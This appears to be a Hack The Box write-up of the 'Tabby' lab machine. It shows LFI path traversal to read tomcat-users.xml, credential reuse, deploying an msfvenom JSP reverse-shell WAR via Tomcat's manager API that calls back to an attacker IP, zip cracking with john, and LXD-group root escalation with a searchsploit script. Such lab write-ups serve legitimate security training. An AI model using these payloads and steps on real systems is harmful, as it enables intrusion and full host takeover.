---
layout: post
title: HTB Machine - Tabby
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/9b4c7b192eb00be8460364338e48f21f.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/9b4c7b192eb00be8460364338e48f21f.png
share-img: https://www.hackthebox.com/storage/avatars/9b4c7b192eb00be8460364338e48f21f.png
tags: [ HTB, Hack the Box,Tomcat,JSP,LXD,Web,Vulnerability Assessment,Common Applications,Authentication,Reconnaissance,Password Cracking,Privilege Abuse,Local File Inclusion,Misconfiguration]
---
scans:
```zsh
linux machine
sudo nmap -sS 10.10.10.194 --open --min-rate 5000 -n -Pn -oG ./nmap/allports
sudo nmap -sCV 10.10.10.194 -p22,80,8080 -oN ./nmap/targeted 
```
When browsing to the webpage we find a static website.

when browsing to http://megahosting.htb/news.php?file=statement the page doesnt load, then we will ad to /etc/hosts IP to resolve properly.
 
Finally when it loads http://megahosting.htb/news.php?file=statement we see some text. The url address seems juice, if we modify the statement word the it does not load. With this we can infer an LFI. Lets try a small proof of concept: 

http://megahosting.htb/news.php?file=../../../../../../../../etc/passwd

The page display a file within the machine filesystem, LFI is possitive. We see only 2 users root and ash. Not much we can do since we cannot display the flag. 

When browsing to the site in the other port http://10.10.10.194:8080/ we get a it works sign mentioning tomcat. Since we know this is a Tomcat we could perhaps try to access the gui manager and to deploy a malicious .war file to gain access to the server. A search for 'tomcat manager default path' can provide what we need. It does not work on port 80 but when trying with port 8080 we get a request to enter credentials (that we dont have).

http://megahosting.htb:8080/manager/html
http://megahosting.htb:8080/host-manager/html

if we cancel the login prompt an error appears and it mentions the tomcat-user.xml. Perhaps we can try our LFI to display it. 

http://megahosting.htb/news.php?file=../../../../../../../../conf/tomcat-users.xml

No luck. Perhaps the file is in another location. We know is a tomcat9 that is installed in /usr/share/tomcat9. Lets try that route then wiht our LFI and the users.xml.

http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/conf/tomcat-users.xml

no luck again, perhaps again the file is not placed there for tomcat9. Lets search again but this time with the route we found in the main page 

google: usr/share/tomcat9 tomcat-users.xml

we come accross this page that places our xml file in another directory. Basically etc instead of conf. 

[Tomcat9 filelist](https://packages.ubuntu.com/focal/all/tomcat9/filelist)

http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml

Now we can see the xml (after pressing ctrl+u to view the page source). There is a user and a pass. It is mention the roles the user has, like admin-gui and manager-script.
```zsh
tomcat:$3cureP4s5w0rd123!
```
we will use the credentials on our manager page. We are not granted further access cause we are restricted. Let's try and fuzz the website from that point.  

```zsh
ffuf -c -t 200 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.194:8080/manager/FUZZ -ic
images                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
html                    [Status: 401, Size: 2499, Words: 457, Lines: 64, Duration: 74ms]
status                  [Status: 401, Size: 2499, Words: 457, Lines: 64, Duration: 56ms]
text                    [Status: 401, Size: 2499, Words: 457, Lines: 64, Duration: 53ms]
```
the status page provides just further info for our recon. When checking the text file we get 'FAIL - Unknown command [/]' . It seems to be executing something so we might want to dig further into what this text file does. Google tomcat /manager/text

we come accross the official documentation that explains we can interact with the host manager.

[Tomcat documentation](https://tomcat.apache.org/tomcat-8.5-doc/host-manager-howto.html)

At this point I'm going to summarize. There are the manager and the host-manager pages. We want to access the host-manager to upload a war but we dont have access via GUI to do this. we found the manager and find that we have access to a text module that will allow us to interact with the host-manager. The documentation from the previous link states how to get the list of applications. 
```zsh
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```
we can create our own application and then upload it to execute. Basically what we could do in via tomcat GUI but now via command line. Search for a java payload in msfvenom that will establish a reverse shell, in this case in java. Once we have identify it create the war file with msfvenom. 
```zsh
msfvenom -l payloads | grep java
    java/jsp_shell_reverse_tcp   
    
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f war -o reverse.war
```
To deploy the war we will need to search for ways, a google search for 'tomcat deploy application curl' take us to a page that provides and example. Simply we will need to place our machine details.Note that the &update=true at the end of the command is optional.

[Stack Overflow post](https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script)
```
curl -T "myapp.war" "http://manager:manager@localhost:8080/manager/text/deploy?path=/myapp&update=true"

curl -s -u 'tomcat:$3cureP4s5w0rd123!' -T /home/rickybana/Documents/Tabby/reverse.war 'http://10.10.10.194:8080/manager/text/deploy?path=/reverse'
OK - Deployed application at context path [/reverse]
```
our application is installed now and we can verify if we list again the applications availables. 
```zsh
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
/reverse:running:0:reverse
```
set our nc listener and go to the webpage http://10.10.10.194:8080/reverse. Once in stabilize the tty and recon the server. We are not able to take flag because we need to escalate privileges to the user ash. Not much we can examine other than the webpage files. Let's head to var/www/html to check further. Inside the files folder we see the statement file that gave us a clue to the LFI present in the webpage. There is also a zip file but unzipping is not possible since we dont have a pass that it requires. We can try to bruteforce from our machine, to get the file we could run a webserver to download the file into our machine. 
```zsh
python3 -m http.server 8081
wget http://10.10.10.194:8081/16162020_backup.zip
```
now we have the file lets run it through zip2john and then attempt to crack it with john
```zsh
zip2john 16162020_backup.zip > hash                                                                                        

john -wordlist=/usr/share/wordlists/rockyou.txt hash 

admin@it         (16162020_backup.zip)
```
we can unzip the file now with the pass found. Nothing interesting in those files. We could try the password if we think ash reuses the password for his account. This grant us the first flag then.

Checking the privileges the user has we see that he is part of the group lxd, which means he can create a container. What we are trying to do is: since we can create a container with root privileges we can then create a mount point inside that container of our victim machine root filesytem (/) and from there do any changes as a root. If we do a 'searchsploit lxd' a script is shown so we just need to follow the instructions. First we need to download alpine and build it in our machine.
```zsh
searchsploit lxd

searchsploit -m 46978.sh

wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine

sudo bash build-alpine
```
after that we need to get both files into our victim machine, for that we set a python webserver and download both files in a folder we have permission to write in the victim machine. Give execution rights to the bash script. 
```zsh
wget http://10.10.14.4/alpine-v3.18-x86_64-20230707_0645.tar.gz
wget http://10.10.14.4/46978.sh
chmod +x 46978.sh 
```
execute the script. An error is showned that  lxc: command not found. If we examine the PATH in our victim machine, we see it is a very short one, perhaps it cannot find the binary because of it. Lets display our attack machine PATH which probably is larger an input that into our victim machine to run the  script once again. 
```zsh
export PATH=((NEW PATH FOLDERS))

./46978.sh -f alpine-v3.18-x86_64-20230707_0645.tar.gz
```
Now the script is able to run. From there just follow the instructions on the script to find where the root folder from our victim machine is mounted. 
```zsh
cat /mnt/root/root/root.txt
```
